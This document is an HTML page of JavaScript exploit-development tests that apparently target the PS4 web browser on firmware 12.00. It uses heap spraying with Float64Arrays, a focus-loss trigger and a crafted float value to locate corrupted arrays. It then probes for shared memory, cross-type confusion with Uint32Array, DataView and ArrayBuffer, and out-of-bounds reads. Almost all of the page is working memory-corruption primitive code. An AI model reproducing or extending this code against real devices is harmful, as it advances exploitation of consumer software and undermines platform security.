<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Advanced Tests</title>
</head>
<body>

<h1>PS4 12.00 - ADVANCED CONFUSION TESTS</h1>

<h2>STAGE 1: Create First Corrupted with Markers</h2>
<button onclick="stage1()">CREATE FIRST</button>
<div id="s1"></div>

<script>
var g_first = null;
var g_arrays = [];

function stage1() {
    const r = document.getElementById('s1');
    r.innerHTML = 'Creating arrays with markers<br>';
    
    const P = 2.121995791e-314;
    g_arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        const a = new Float64Array(8);
        // Write unique markers
        a[0] = i;
        a[1] = i + 10000;
        a[2] = i + 20000;
        g_arrays.push(a);
    }
    
    r.innerHTML += 'Press OPTIONS ONCE<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += 'Triggering...<br>';
        
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 0) {
            g_first = corrupted[0];
            
            // Write markers BEFORE any tests
            const view = new DataView(g_first.buffer);
            view.setUint32(0, 0xAAAAAAAA, true);
            view.setUint32(4, 0xBBBBBBBB, true);
            view.setBigUint64(8, 0xCCCCCCCCDDDDDDDDn, true);
            view.setBigUint64(16, 0xEEEEEEEEFFFFFFFFn, true);
            
            r.innerHTML += '<b>✓ First array corrupted and marked</b><br>';
            r.innerHTML += 'Markers: 0xAAAAAAAA, 0xBBBBBBBB, 0xCCCC..., 0xEEEE...<br>';
        }
        
        window.onblur = null;
    };
}
</script>

<hr>

<h2>TEST 1: Float64Array Inheritance</h2>
<button onclick="test1()">RUN TEST 1</button>
<div id="t1"></div>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 1: Float64Array → Float64Array</b><br><br>';
    
    // Trigger corruption again to get second array
    r.innerHTML += 'Press OPTIONS to get second array<br>';
    
    window.onblur = function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 1) {
            const g_second = corrupted[1];
            
            r.innerHTML += '<br><b>Got second array</b><br>';
            
            // Check if second inherits markers from first
            const view2 = new DataView(g_second.buffer);
            
            const m1 = view2.getUint32(0, true);
            const m2 = view2.getUint32(4, true);
            const m3 = view2.getBigUint64(8, true);
            const m4 = view2.getBigUint64(16, true);
            
            r.innerHTML += '<br>Second array markers:<br>';
            r.innerHTML += 'Offset 0: 0x' + m1.toString(16) + (m1 === 0xAAAAAAAA ? ' ✓ MATCH!' : '') + '<br>';
            r.innerHTML += 'Offset 4: 0x' + m2.toString(16) + (m2 === 0xBBBBBBBB ? ' ✓ MATCH!' : '') + '<br>';
            r.innerHTML += 'Offset 8: 0x' + m3.toString(16) + (m3 === 0xCCCCCCCCDDDDDDDDn ? ' ✓ MATCH!' : '') + '<br>';
            r.innerHTML += 'Offset 16: 0x' + m4.toString(16) + (m4 === 0xEEEEEEEEFFFFFFFFn ? ' ✓ MATCH!' : '') + '<br>';
            
            // Sanity check
            r.innerHTML += '<br><b>Sanity Check:</b><br>';
            g_first[7] = 123.456;
            const check = g_second[7];
            r.innerHTML += 'Write g_first[7]=123.456, g_second[7]=' + check + '<br>';
            
            if(Math.abs(check - 123.456) < 0.001) {
                r.innerHTML += '✓ SHARED MEMORY CONFIRMED<br>';
            }
        }
        
        window.onblur = null;
    };
}
</script>

<hr>

<h2>TEST 2: Float64Array → Uint32Array</h2>
<button onclick="test2()">RUN TEST 2</button>
<div id="t2"></div>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 2: Trying Uint32Array as second type</b><br><br>';
    
    // Create Uint32Array spray
    r.innerHTML += 'Creating Uint32Array spray...<br>';
    
    const spray = [];
    for(let i = 0; i < 5000; i++) {
        const a = new Uint32Array(16);
        a.fill(0x42424242);
        spray.push(a);
    }
    
    r.innerHTML += 'Created 5000 Uint32Arrays<br>';
    
    // Check if any overlap with first
    r.innerHTML += '<br>Checking for overlap:<br>';
    
    const view1 = new DataView(g_first.buffer);
    let found = false;
    
    for(let i = 0; i < spray.length; i++) {
        const view2 = new DataView(spray[i].buffer);
        
        // Check if spray array sees our markers
        for(let offset = 0; offset < Math.min(64, spray[i].byteLength); offset += 4) {
            const val = view2.getUint32(offset, true);
            
            if(val === 0xAAAAAAAA || val === 0xBBBBBBBB) {
                r.innerHTML += '<b>✓ Uint32Array[' + i + '] sees marker at offset ' + offset + '!</b><br>';
                found = true;
                
                // Sanity check
                r.innerHTML += '<br>Sanity: Writing via Uint32Array...<br>';
                spray[i][0] = 0x99999999;
                
                const check_f64 = g_first[0];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = check_f64;
                const check_u32 = new Uint32Array(buf)[0];
                
                r.innerHTML += 'g_first[0] as hex: 0x' + check_u32.toString(16) + '<br>';
                
                if(check_u32 === 0x99999999) {
                    r.innerHTML += '<b>✓✓ CROSS-TYPE CONFUSION CONFIRMED!</b><br>';
                }
                
                break;
            }
        }
        
        if(found) break;
    }
    
    if(!found) {
        r.innerHTML += 'No Uint32Array overlap detected<br>';
    }
}
</script>

<hr>

<h2>TEST 3: Float64Array → DataView</h2>
<button onclick="test3()">RUN TEST 3</button>
<div id="t3"></div>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 3: Trying DataView as accessor</b><br><br>';
    
    // Create DataView spray
    const spray = [];
    for(let i = 0; i < 1000; i++) {
        const buf = new ArrayBuffer(64);
        const dv = new DataView(buf);
        
        // Write pattern
        for(let j = 0; j < 64; j += 4) {
            dv.setUint32(j, 0x55550000 + i, true);
        }
        
        spray.push(dv);
    }
    
    r.innerHTML += 'Created 1000 DataViews<br>';
    
    // Check if any sees our markers
    r.innerHTML += '<br>Checking for marker visibility:<br>';
    
    let found = false;
    
    for(let i = 0; i < spray.length; i++) {
        const dv = spray[i];
        
        for(let offset = 0; offset < 64; offset += 4) {
            const val = dv.getUint32(offset, true);
            
            if(val === 0xAAAAAAAA || val === 0xBBBBBBBB) {
                r.innerHTML += '<b>✓ DataView[' + i + '] sees marker at offset ' + offset + '!</b><br>';
                found = true;
                
                // Sanity
                r.innerHTML += '<br>Sanity: Writing via DataView...<br>';
                dv.setUint32(0, 0x88888888, true);
                
                const view1 = new DataView(g_first.buffer);
                const check = view1.getUint32(0, true);
                
                r.innerHTML += 'Check g_first offset 0: 0x' + check.toString(16) + '<br>';
                
                if(check === 0x88888888) {
                    r.innerHTML += '<b>✓✓ DATAVIEW CONFUSION CONFIRMED!</b><br>';
                }
                
                break;
            }
        }
        
        if(found) break;
    }
    
    if(!found) {
        r.innerHTML += 'No DataView overlap<br>';
    }
}
</script>

<hr>

<h2>TEST 4: Float64Array → ArrayBuffer</h2>
<button onclick="test4()">RUN TEST 4</button>
<div id="t4"></div>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 4: Direct ArrayBuffer manipulation</b><br><br>';
    
    // Create raw ArrayBuffer spray
    const spray = [];
    for(let i = 0; i < 5000; i++) {
        const buf = new ArrayBuffer(64);
        const view = new Uint8Array(buf);
        view.fill(0x77);
        spray.push(buf);
    }
    
    r.innerHTML += 'Created 5000 ArrayBuffers<br>';
    
    // Check for overlap
    r.innerHTML += '<br>Checking for buffer overlap:<br>';
    
    let found = false;
    
    for(let i = 0; i < spray.length; i++) {
        const buf = spray[i];
        const view = new Uint32Array(buf);
        
        for(let j = 0; j < view.length; j++) {
            if(view[j] === 0xAAAAAAAA || view[j] === 0xBBBBBBBB) {
                r.innerHTML += '<b>✓ ArrayBuffer[' + i + '] overlaps at index ' + j + '!</b><br>';
                found = true;
                
                // Sanity
                view[0] = 0x66666666;
                
                const v1 = new DataView(g_first.buffer);
                const check = v1.getUint32(0, true);
                
                r.innerHTML += 'Sanity check: 0x' + check.toString(16) + '<br>';
                
                if(check === 0x66666666) {
                    r.innerHTML += '<b>✓✓ ARRAYBUFFER CONFUSION!</b><br>';
                }
                
                break;
            }
        }
        
        if(found) break;
    }
    
    if(!found) {
        r.innerHTML += 'No ArrayBuffer overlap<br>';
    }
}
</script>

<hr>

<h2>TEST 5: Property Inheritance Test</h2>
<button onclick="test5()">RUN TEST 5</button>
<div id="t5"></div>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 5: Custom Property Inheritance</b><br><br>';
    
    // Add custom property to first
    r.innerHTML += 'Adding custom property to g_first...<br>';
    
    g_first.customMarker = {
        id: 'UNIQUE_MARKER_12345',
        value: 0xDEADBEEF
    };
    
    r.innerHTML += 'Added customMarker property<br>';
    
    // Trigger new corruption
    r.innerHTML += '<br>Press OPTIONS for second array<br>';
    
    window.onblur = function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(10));
            spray[i].fill(P);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 1) {
            const g_second = corrupted[corrupted.length - 1];
            
            r.innerHTML += '<br><b>Got second array</b><br>';
            
            // Check if second has the custom property
            r.innerHTML += '<br>Checking for property inheritance:<br>';
            
            if(g_second.customMarker) {
                r.innerHTML += '<b>✓✓ PROPERTY INHERITED!</b><br>';
                r.innerHTML += 'customMarker.id: ' + g_second.customMarker.id + '<br>';
                r.innerHTML += 'customMarker.value: 0x' + g_second.customMarker.value.toString(16) + '<br>';
            } else {
                r.innerHTML += 'No property inheritance<br>';
            }
            
            // Sanity
            r.innerHTML += '<br>Sanity: Modifying property...<br>';
            g_first.customMarker.value = 0xCAFEBABE;
            
            if(g_second.customMarker && g_second.customMarker.value === 0xCAFEBABE) {
                r.innerHTML += '<b>✓ Property is SHARED reference!</b><br>';
            }
        }
        
        window.onblur = null;
    };
}
</script>

<hr>

<h2>TEST 6: OOB with Fresh Second Array</h2>
<button onclick="test6()">RUN TEST 6</button>
<div id="t6"></div>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1 first<br>';
        return;
    }
    
    r.innerHTML = '<b>TEST 6: OOB with dynamically created second array</b><br><br>';
    
    r.innerHTML += 'Press OPTIONS for second array<br>';
    
    window.onblur = function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(10));
            spray[i].fill(P);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 1) {
            const g_second = corrupted[corrupted.length - 1];
            
            r.innerHTML += '<br><b>Testing OOB on second array:</b><br>';
            
            // Try OOB on fresh second array
            for(let idx = 8; idx < 15; idx++) {
                try {
                    const val = g_second[idx];
                    
                    if(val !== undefined) {
                        const buf = new ArrayBuffer(8);
                        new Float64Array(buf)[0] = val;
                        const hex = new BigUint64Array(buf)[0].toString(16);
                        
                        r.innerHTML += 'g_second[' + idx + ']: 0x' + hex + '<br>';
                        
                        if(hex !== '7ff8000000000000') {
                            r.innerHTML += '<b>✓ NON-NaN VALUE AT OOB!</b><br>';
                        }
                    }
                } catch(e) {
                    r.innerHTML += 'Index ' + idx + ': ' + e.message + '<br>';
                }
            }
            
            // Sanity
            r.innerHTML += '<br>Sanity: Checking shared memory:<br>';
            g_first[3] = 777.888;
            r.innerHTML += 'g_second[3] = ' + g_second[3] + '<br>';
            
            if(Math.abs(g_second[3] - 777.888) < 0.001) {
                r.innerHTML += '✓ Shared memory OK<br>';
            }
        }
        
        window.onblur = null;
    };
}
</script>

<hr>

<h2>SUMMARY</h2>
<button onclick="summary()">SHOW SUMMARY</button>
<div id="summary"></div>

<script>
function summary() {
    const r = document.getElementById('summary');
    r.innerHTML = '<h3>TEST SUMMARY</h3>';
    
    r.innerHTML += '<b>Strategy employed:</b><br>';
    r.innerHTML += '1. Mark first corrupted array with unique values<br>';
    r.innerHTML += '2. For each test, create fresh second corrupted array<br>';
    r.innerHTML += '3. Test different type combinations<br>';
    r.innerHTML += '4. Sanity check each positive result<br><br>';
    
    r.innerHTML += '<b>Tests performed:</b><br>';
    r.innerHTML += 'TEST 1: Float64 → Float64 (inheritance check)<br>';
    r.innerHTML += 'TEST 2: Float64 → Uint32 (cross-type)<br>';
    r.innerHTML += 'TEST 3: Float64 → DataView (accessor)<br>';
    r.innerHTML += 'TEST 4: Float64 → ArrayBuffer (direct)<br>';
    r.innerHTML += 'TEST 5: Custom property inheritance<br>';
    r.innerHTML += 'TEST 6: OOB on fresh second array<br><br>';
    
    r.innerHTML += '<b>Look for:</b><br>';
    r.innerHTML += '- Marker visibility in different types<br>';
    r.innerHTML += '- Property inheritance<br>';
    r.innerHTML += '- Non-NaN OOB values<br>';
    r.innerHTML += '- Any cross-type confusion<br><br>';
    
    r.innerHTML += '<b>Report ANY anomaly immediately!</b><br>';
}
</script>

</body>
</html>
